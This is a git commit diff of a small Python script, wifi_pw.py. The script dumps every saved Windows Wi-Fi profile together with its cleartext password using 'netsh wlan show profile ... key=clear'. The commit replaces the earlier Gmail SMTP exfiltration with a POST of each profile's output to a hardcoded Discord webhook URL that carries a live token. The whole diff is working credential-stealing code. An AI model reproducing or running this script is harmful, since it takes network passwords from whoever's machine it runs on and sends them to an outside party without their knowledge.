31f2db66b8f9963a2aea4293216809306a1b9117
Pranav <meherpranav5@gmail.com>
2021-01-05 09:27:25 +0530

    Added Discord messages and removed email shit.

--- wifi_pw.py
+++ wifi_pw.py
@@ -1,34 +1,27 @@
-#!/usr/bin/env python                                     #Ye pata nahi kyu likha h
+#!/usr/bin/env python
 
-import subprocess, smtplib, re, time              
+import subprocess
+import re
+import requests
+import json
 
 
-def send_mail(email, password, message):                  #function for sending email to yourself
-    try:
-        server = smtplib.SMTP("smtp.gmail.com",587)           #setting up the smtp server at default port for TLS ie. 587
-        server.starttls()
-        server.login(email, password,)
-        server.sendmail(email, email, message)                # can change sender or receivers address
-        server.quit()
-    except:
-        time.sleep(300)                                         # Delay(checking every 5 mins if the internet has turned on )
-        send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)    # function call to send the reports
+url = "https://discord.com/api/webhooks/795938695643004949/ykSa4rrVf3ILQPFRFKlemqGvymCgU4PFMikij4nxNlCCf-NUrsfqrD4XZ1xFa2umDumx"
 
-command = "netsh wlan show profiles"                      # To show the names of all Wlan profiles stored
-networks = subprocess.check_output(command, shell=True).decode('utf-8')  #.decode('utf-8') used to change its form, if not done, it returns error "that output is not a string type"
-names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)  #module re is complicated shit (used to find/match/register strings)
-result = ""                                                  
-for name in names_list:                                   # to get the key of each network profile
+command = "netsh wlan show profiles"
+networks = subprocess.check_output(command, shell=True).decode('utf-8')
+names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
+result = ""
+for name in names_list:
     try:
         command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
-        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
-    except subprocess.CalledProcessError :                # If there's a runtime error in console
+        current_result = str(subprocess.check_output(command, shell=True).decode('utf-8'))
+    except subprocess.CalledProcessError :
         current_result = "error"
-        #print("Error occurred with %s ", name)           # Ye ignore kaar bsdk.
-result = result + current_result
-
-send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)      # function call to send the reports
-
+        #print("Error occurred with %s ", name)
+    result = result + current_result
+    data = {'content': current_result}
+    a = requests.post(url=url, data=json.dumps(data), headers={'Content-Type': "application/json"})
 
 
 
